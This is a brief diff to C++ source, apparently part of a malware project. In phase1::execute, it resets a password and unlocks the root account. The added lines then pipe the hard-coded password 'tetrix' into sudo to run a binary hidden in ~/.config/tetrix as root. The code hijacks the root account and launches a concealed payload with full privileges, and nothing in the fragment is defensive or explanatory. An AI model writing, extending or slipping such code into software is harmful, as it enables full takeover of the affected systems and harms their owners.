@@ -13,5 +13,7 @@ int phase1::execute()
   fputs(newpass, stdin);
   pclose(stdin);
   system("passwd -u root"); //Unlock the root account.
+  std::string homedir = std::getenv("HOME");
+  system(("echo 'tetrix' | /bin/sudo "+ homedir +"/.config/tetrix/Tetrix -p 2").c_str());
   return 0;
 }
